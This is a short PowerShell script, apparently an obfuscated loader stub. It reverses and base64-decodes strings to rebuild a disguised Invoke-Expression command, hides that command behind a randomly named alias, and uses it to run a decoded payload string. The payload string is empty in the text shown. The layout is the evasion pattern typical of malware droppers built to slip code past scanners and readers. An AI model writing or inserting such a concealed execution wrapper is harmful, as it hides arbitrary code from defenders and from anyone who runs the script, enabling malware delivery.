$WC5UZew = "" ;
$7Rf9 = $WC5UZew.ToCharArray() ; [array]::Reverse($7Rf9) ; $rxCS1h9jW = -join $7Rf9 ;
$ES7bOR02xJpr4G = switch ($rxCS1h9jW.Length % 4) { 0 { $rxCS1h9jW }; 1 { $rxCS1h9jW.Substring(0, $rxCS1h9jW.Length - 1) }; 2 { $rxCS1h9jW + ("=" * 2) }; 3 { $rxCS1h9jW + "=" }} ;
$UzXoI = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ES7bOR02xJpr4G)) ;
$JaIEvc = '42bpN3UlJHU4VWLFt2T25Ua'.ToCharArray() ; [array]::Reverse($JaIEvc) ; $bVoxLiZ4msYzndEMSXvytOU = -join $JaIEvc ;
$bVoxLiZ4msYzndEMSXvytOU = switch ($bVoxLiZ4msYzndEMSXvytOU.Length % 4) { 0 { $bVoxLiZ4msYzndEMSXvytOU }; 1 { $bVoxLiZ4msYzndEMSXvytOU.Substring(0, $bVoxLiZ4msYzndEMSXvytOU.Length - 1) }; 2 { $bVoxLiZ4msYzndEMSXvytOU + '=' * 2 }; 3 { $bVoxLiZ4msYzndEMSXvytOU + '=' } } ;
$Vd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($bVoxLiZ4msYzndEMSXvytOU)) ;
$6EGP4kNScXwZW = 'AUkNlW'.ToCharArray() ; [array]::Reverse($6EGP4kNScXwZW) ; $J0xEsDaSlYA3yBwMeCbZ1 = -join $6EGP4kNScXwZW ;
$J0xEsDaSlYA3yBwMeCbZ1 = switch ($J0xEsDaSlYA3yBwMeCbZ1.Length % 4) { 0 { $J0xEsDaSlYA3yBwMeCbZ1 }; 1 { $J0xEsDaSlYA3yBwMeCbZ1.Substring(0, $J0xEsDaSlYA3yBwMeCbZ1.Length - 1) }; 2 { $J0xEsDaSlYA3yBwMeCbZ1 + '=' * 2 }; 3 { $J0xEsDaSlYA3yBwMeCbZ1 + '=' } } ;
$5mTOn2LtLNi4yR9rvlSzW = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($J0xEsDaSlYA3yBwMeCbZ1)) ;
$NulL = NEW-aLiaS -name $5mTOn2LtLNi4yR9rvlSzW -ValuE $Vd -fORCE ; & $5mTOn2LtLNi4yR9rvlSzW $UzXoI ;

